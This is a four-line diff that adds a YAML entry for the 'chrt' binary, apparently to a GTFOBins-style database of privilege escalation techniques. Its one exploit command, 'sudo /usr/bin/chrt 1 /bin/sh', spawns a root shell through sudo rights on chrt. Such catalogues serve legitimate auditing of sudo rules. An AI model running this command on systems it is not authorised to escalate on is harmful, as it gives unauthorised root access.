@@ -1,0 +1,4 @@
+name: chrt
+binary_path: /usr/bin/chrt
+exploit_cmds:
+- sudo /usr/bin/chrt 1 /bin/sh
